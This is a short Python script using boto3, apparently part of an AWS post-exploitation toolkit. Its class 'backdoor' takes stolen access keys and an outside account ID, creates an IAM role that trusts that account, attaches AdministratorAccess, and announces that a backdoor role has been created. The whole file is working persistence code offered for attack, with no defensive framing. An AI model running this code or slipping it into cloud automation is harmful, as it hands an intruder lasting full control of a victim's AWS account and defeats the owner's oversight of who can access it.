import boto3
import json
import time

class backdoor:
    pass

    def attack(self, role, key, secret, account_id):
        iam = boto3.client("iam",
                aws_access_key_id= key,
                aws_secret_access_key=secret,
                region_name="us-east-2")
        assume_role_policy_document = json.dumps({
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "sts:AssumeRole",
                    "Principal": {
                        "AWS": account_id
                },
                "Condition": {}
                }
            ]
        })

        response = iam.create_role(
            RoleName=role,
            AssumeRolePolicyDocument=assume_role_policy_document
        )

        role_name = response["Role"]["RoleName"]
        time.sleep(5)
        response = iam.attach_role_policy(
            RoleName=role_name,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        print("Backdoor role with Administrator access created - %s" %role_name)
